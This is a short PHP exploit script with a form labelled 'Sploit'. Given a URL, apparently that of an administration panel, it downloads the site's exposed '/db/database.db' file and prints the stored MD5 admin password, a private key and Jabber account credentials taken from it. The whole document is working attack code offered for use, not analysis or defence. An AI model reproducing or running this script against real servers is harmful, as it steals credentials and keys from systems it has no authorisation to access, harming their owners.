<?php
    $url = getURL();
    
    if ($url !== NULL) {
        $database = @file_get_contents($url . &#039;/db/database.db&#039;);
        
        if ($database !== FALSE) {
            file_put_contents(&#039;tmp.db&#039;, $database);
            
            $password_md5     = getOption(&#039;password_md5&#039;);
            $pkey             = getOption(&#039;pkey&#039;);
            $jabber_on        = getOption(&#039;jabber_on&#039;);
            $jabber_sender    = getOption(&#039;jabber_sender&#039;);
            $jabber_password  = getOption(&#039;jabber_password&#039;);
            $jabber_port      = getOption(&#039;jabber_port&#039;);
            $jabber_recipient = getOption(&#039;jabber_recepient&#039;);
            
            writeLine(&#039;URL:          &#039; . htmlentities($url));
            writeLine(&#039;MD5 password: &#039; . htmlentities($password_md5));
            writeLine(&#039;pkey:         &#039; . htmlentities($pkey));
            writeLine(&#039;Jabber        &#039; . htmlentities($jabber_on));
            writeLine(&#039;Sender:       &#039; . htmlentities($jabber_sender));
            writeLine(&#039;Password:     &#039; . htmlentities($jabber_password));
            writeLine(&#039;Port:         &#039; . htmlentities($jabber_port));
            writeLine(&#039;Recipient:    &#039; . htmlentities($jabber_recipient));
            
            unlink(&#039;tmp.db&#039;);
        }
        else {
            writeLine(&#039;Cannot get database...&#039;);
        }
        
        writeLine(&#039;&#039;);
        echo(&#039;<a href="&#039; . basename($_SERVER[&#039;PHP_SELF&#039;]) . &#039;">Back</a>&#039;);
    }
    else {
?>
<form method="POST">
<label for="url">URL:</label> <input id="url" name="url" type="url" value="http://secureserver02792.com/bncadmin/" />
<input type="submit" value="Sploit" />
</form>
<?php
    }
    
    function getURL() {
        global $_POST;
        
        if (isset($_POST[&#039;url&#039;])      &&
            !is_array($_POST[&#039;url&#039;])  &&
            is_string($_POST[&#039;url&#039;])  &&
            strlen($_POST[&#039;url&#039;]) > 0 &&
            filter_var($_POST[&#039;url&#039;], FILTER_VALIDATE_URL)) {
            return $_POST[&#039;url&#039;];
        }
        
        return NULL;
    }
    
    function writeLine($str) {
        echo($str . "\n");
    }
    
    function getOption($option) {
        $db     = new SQLite3(&#039;tmp.db&#039;);
        $sql    = &#039;SELECT value AS result FROM options WHERE param="&#039; . $option . &#039;"&#039;;
        $result = $db-> querySingle($sql, true);
        
        $db-> close();
        
        return sizeof($result) > 0 ? $result[&#039;result&#039;] : &#039;&#039;;
    }
?>

